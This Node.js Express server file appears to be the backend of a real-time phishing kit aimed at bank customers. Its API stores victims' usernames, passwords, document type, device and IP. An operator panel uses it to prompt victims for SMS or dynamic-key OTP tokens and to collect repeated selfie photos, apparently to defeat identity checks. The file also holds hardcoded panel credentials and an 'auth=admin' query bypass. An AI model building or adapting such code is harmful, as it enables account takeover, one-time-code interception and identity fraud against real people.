import express from 'express'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

const __filename = fileURLToPath(import.meta.url)
const __dirname = dirname(__filename)

const app = express()
const PORT = Number(process.env.PORT) || 4173

app.use(express.json({ limit: '25mb' }))
app.use(express.urlencoded({ limit: '25mb', extended: true }))

// Enable CORS safely for all browsers and devices
app.use((req, res, next) => {
  const origin = req.headers.origin
  if (origin) {
    res.setHeader('Access-Control-Allow-Origin', origin)
    res.setHeader('Access-Control-Allow-Credentials', 'true')
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization')
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200)
  }
  next()
})

const PANEL_USER = process.env.PANEL_USER || 'Morderkaiser'
const PANEL_PASSWORD = process.env.PANEL_PASSWORD || 'M3q7Xp9Wv2R4k5T8zY'

export const authMiddleware = (req, res, next) => {
  if (req.query.auth === 'admin' || req.query.key === PANEL_PASSWORD) {
    return next()
  }

  const authHeader = req.headers.authorization
  const isApi = req.path.startsWith('/api') || req.originalUrl?.startsWith('/api')

  if (!authHeader) {
    if (isApi) {
      return res.status(401).json({ error: 'Authentication required' })
    }
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"')
    return res.status(401).send('Authentication required')
  }

  const authParts = authHeader.split(' ')
  if (authParts.length !== 2 || authParts[0].toLowerCase() !== 'basic') {
    if (isApi) {
      return res.status(401).json({ error: 'Authentication required' })
    }
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"')
    return res.status(401).send('Authentication required')
  }

  const credentials = Buffer.from(authParts[1], 'base64').toString().split(':')
  const user = credentials[0]
  const pass = credentials[1]

  if (user === PANEL_USER && pass === PANEL_PASSWORD) {
    return next()
  }

  if (isApi) {
    return res.status(401).json({ error: 'Invalid credentials' })
  }
  res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"')
  return res.status(401).send('Invalid credentials')
}

// In-memory sessions store
export let sessions = {}

// 1. Create or update a session
app.post('/api/sessions', (req, res) => {
  const { id, username, password, tipoUsuario, device, ip, state } = req.body
  if (!id) return res.status(400).json({ error: 'Missing session id' })

  if (sessions[id]) {
    sessions[id] = {
      ...sessions[id],
      username: username || sessions[id].username,
      password: password || sessions[id].password,
      tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
      device: device || sessions[id].device,
      ip: ip || sessions[id].ip,
      state: state || sessions[id].state,
      last_seen: Date.now(),
      updatedAt: Date.now(),
    }
  } else {
    sessions[id] = {
      id,
      index: Object.keys(sessions).length + 1,
      username: username || '—',
      password: password || '—',
      tipoUsuario: tipoUsuario || 'DNI',
      device: device || 'desktop',
      ip: ip || '127.0.0.1',
      state: state || 'waiting',
      token: '',
      selfie: '',
      selfies: [],
      createdAt: Date.now(),
      last_seen: Date.now(),
      updatedAt: Date.now(),
    }
  }
  res.json({ success: true, session: sessions[id] })
})

// 2. Get all sessions (calculated online state)
app.get('/api/sessions', (req, res) => {
  const now = Date.now()
  const list = Object.values(sessions).map((s) => {
    const online = now - s.last_seen < 20000
    return { ...s, online }
  })
  res.json(list)
})

// 3. Get single session (polling check)
app.get('/api/sessions/:id', (req, res) => {
  const { id } = req.params
  const session = sessions[id]
  if (!session) return res.status(404).json({ error: 'Session not found' })
  res.json(session)
})

// 4. Update session token (from OTP page)
app.post('/api/sessions/:id/token', (req, res) => {
  const { id } = req.params
  const { token } = req.body
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })

  sessions[id].token = token

  // Set state based on current action (sms or dinamica) before clearing the action
  const currentAction = sessions[id].action
  if (currentAction === 'sms') {
    sessions[id].state = 'received-sms'
  } else {
    sessions[id].state = 'received-dinamica'
  }

  sessions[id].action = null
  sessions[id].last_seen = Date.now()
  sessions[id].updatedAt = Date.now()
  res.json({ success: true, session: sessions[id] })
})

// 5. Update session ping (keepalive)
app.post('/api/sessions/:id/ping', (req, res) => {
  const { id } = req.params
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })

  sessions[id].last_seen = Date.now()
  res.json({ success: true })
})

// 6. Set action for a session (from operator panel)
app.post('/api/sessions/:id/action', (req, res) => {
  const { id } = req.params
  const { action, state } = req.body
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })

  sessions[id].state = state || sessions[id].state
  sessions[id].action = action

  // If requesting a new token input (dinamica or sms), reset the token
  if (action === 'dinamica' || action === 'sms') {
    sessions[id].token = ''
  }

  sessions[id].last_seen = Date.now()
  sessions[id].updatedAt = Date.now()
  res.json({ success: true, session: sessions[id] })
})

// 7. Update session state (from client page)
app.post('/api/sessions/:id/state', (req, res) => {
  const { id } = req.params
  const { state, resetAction } = req.body
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })

  if (state) sessions[id].state = state
  if (resetAction) sessions[id].action = null
  sessions[id].last_seen = Date.now()
  sessions[id].updatedAt = Date.now()
  res.json({ success: true, session: sessions[id] })
})

// 8. Update selfie photo (from selfie validation page - accumulates all photos)
app.post('/api/sessions/:id/selfie', (req, res) => {
  const { id } = req.params
  const { photo } = req.body
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })

  if (!Array.isArray(sessions[id].selfies)) {
    sessions[id].selfies = []
  }

  if (photo) {
    sessions[id].selfie = photo
    sessions[id].selfies.push({
      id: `selfie_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
      photo,
      timestamp: Date.now(),
    })
  }

  sessions[id].state = 'received-selfie'
  sessions[id].last_seen = Date.now()
  sessions[id].updatedAt = Date.now()
  res.json({ success: true, session: sessions[id] })
})

// 9. Clear all sessions
app.post('/api/clear', (req, res) => {
  sessions = {}
  res.json({ success: true })
})

// Protect and serve the /panel directory statically without caching
const noCacheOptions = {
  setHeaders: (res) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate')
    res.setHeader('Pragma', 'no-cache')
    res.setHeader('Expires', '0')
  },
}
app.get(['/panel', '/panel/'], authMiddleware, (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate')
  res.setHeader('Pragma', 'no-cache')
  res.setHeader('Expires', '0')
  res.sendFile(join(__dirname, 'public', 'panel', 'index.html'))
})
app.use('/panel', express.static(join(__dirname, 'public', 'panel'), noCacheOptions))
app.use('/panel', express.static(join(__dirname, 'dist', 'panel'), noCacheOptions))

// Static SPA assets
const distDir = join(__dirname, 'dist')
app.use(express.static(distDir))

// Fallback to index.html for SPA routes
app.use((req, res) => {
  res.sendFile(join(distDir, 'index.html'))
})

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Sip server listening on port ${PORT}`)
})
